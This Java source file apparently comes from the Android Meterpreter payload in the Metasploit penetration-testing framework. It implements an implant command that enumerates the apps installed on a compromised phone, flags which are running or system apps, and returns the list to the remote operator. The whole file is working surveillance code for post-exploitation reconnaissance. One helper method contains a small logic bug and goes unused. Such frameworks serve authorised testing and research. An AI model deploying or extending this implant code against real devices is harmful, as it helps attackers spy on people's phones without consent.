package com.metasploit.meterpreter.android;

import android.content.Context;
import android.os.PowerManager;

import android.app.Activity;
import android.app.ActivityManager;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

import java.util.List;

import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.TLVType;
import com.metasploit.meterpreter.command.Command;

public class android_app_list implements Command {
    private static final int TLV_EXTENSIONS         = 20000;
    private static final int TLV_TYPE_APPS_LIST     = TLVPacket.TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 2911);
    private static final int TLV_TYPE_APPS_LIST_OPT = TLVPacket.TLV_META_TYPE_UINT   | (TLV_EXTENSIONS + 2912);
    final Context context = AndroidMeterpreter.getContext();

    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        int opt = request.getIntValue(TLV_TYPE_APPS_LIST_OPT);

        final PackageManager pm = context.getPackageManager();
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);


        switch (opt)
        {
            case 0:
                // Get All Apps

                for (ApplicationInfo packageInfo : packages) {
                    response.addOverflow(TLV_TYPE_APPS_LIST, pm.getApplicationLabel(packageInfo)); // App Name
                    response.addOverflow(TLV_TYPE_APPS_LIST, packageInfo.packageName); // PackageName
                    response.addOverflow(TLV_TYPE_APPS_LIST, Boolean.toString(isAppRunning(context, packageInfo.packageName))); // Running?
                    response.addOverflow(TLV_TYPE_APPS_LIST, Boolean.toString(isSystem(context, packageInfo.packageName))); // System?
                }

                break;
            case 1:
                // Get User apps ONLY
                for (ApplicationInfo packageInfo : packages) {
                    if (!isSystem(context, packageInfo.packageName)) {
                        response.addOverflow(TLV_TYPE_APPS_LIST, pm.getApplicationLabel(packageInfo)); // App Name
                        response.addOverflow(TLV_TYPE_APPS_LIST, packageInfo.packageName); // PackageName
                        response.addOverflow(TLV_TYPE_APPS_LIST, Boolean.toString(isAppRunning(context, packageInfo.packageName))); // Running?
                        response.addOverflow(TLV_TYPE_APPS_LIST, Boolean.toString(false)); // System?
                    }
                }

                break;
            case 2:
                // Get System apps ONLY"
                for (ApplicationInfo packageInfo : packages) {
                    if (isSystem(context, packageInfo.packageName)) {
                        response.addOverflow(TLV_TYPE_APPS_LIST, pm.getApplicationLabel(packageInfo)); // App Name
                        response.addOverflow(TLV_TYPE_APPS_LIST, packageInfo.packageName); // PackageName
                        response.addOverflow(TLV_TYPE_APPS_LIST, Boolean.toString(isAppRunning(context, packageInfo.packageName))); // Running?
                        response.addOverflow(TLV_TYPE_APPS_LIST, Boolean.toString(true)); // System?
                    }
                }

                break;
        }

        // return ERROR_FAILURE;
        return ERROR_SUCCESS;
    }

    private boolean AppRun(final Context context, final String packageName) {
        return isActivtyRunning(context, packageName) && isAppRunning(context, packageName);
    }

    private boolean isActivtyRunning(final Context context, final String packageName) {
        final ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        final List<ActivityManager.RunningTaskInfo> procInfos = activityManager.getRunningTasks(Integer.MAX_VALUE);
        if (procInfos != null)
        {
            for (ActivityManager.RunningTaskInfo task : procInfos) {
                if (context.getPackageName().equalsIgnoreCase(task.baseActivity.getPackageName()))
                    return true;
            }
        }
        return false;
    }

    private boolean isAppRunning(final Context context, final String packageName) {
        final ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        final List<ActivityManager.RunningAppProcessInfo> procInfos = activityManager.getRunningAppProcesses();
        if (procInfos != null)
        {
            for (final ActivityManager.RunningAppProcessInfo processInfo : procInfos) {
                if (processInfo.processName.equalsIgnoreCase(packageName)) {
                    return true;
                }
            }
        }
        return false;
    }

    private boolean isSystem(final Context context, final String packageName) {
        PackageManager pm = context.getPackageManager();

        ApplicationInfo ai;
        try {
            ai = pm.getApplicationInfo(packageName, 0);
            if ((ai.flags & ApplicationInfo.FLAG_SYSTEM) != 0) {
                return true;
            }
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }

        return false;
    }
}
